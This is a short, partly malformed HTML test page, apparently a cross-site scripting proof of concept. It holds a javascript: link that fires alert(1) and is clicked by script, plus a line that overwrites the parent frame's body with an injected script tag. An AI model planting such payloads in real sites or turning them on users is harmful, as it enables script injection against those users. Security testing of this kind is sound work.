!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Page Replace</title>
</head>
     <a id="xssmepls" href="javascript:(()=>{alert(1);})();">test</a>
    <script>
        <a id="xssmepls" href="javascript:(()=>{alert(1);})();">test</a>
        document.getElementById("xssmepls").click();
        window.parent.document.body.innerHTML = '<script>alert("XSS via parent!")</script>';
    </script>
<body>
</body>
</html>
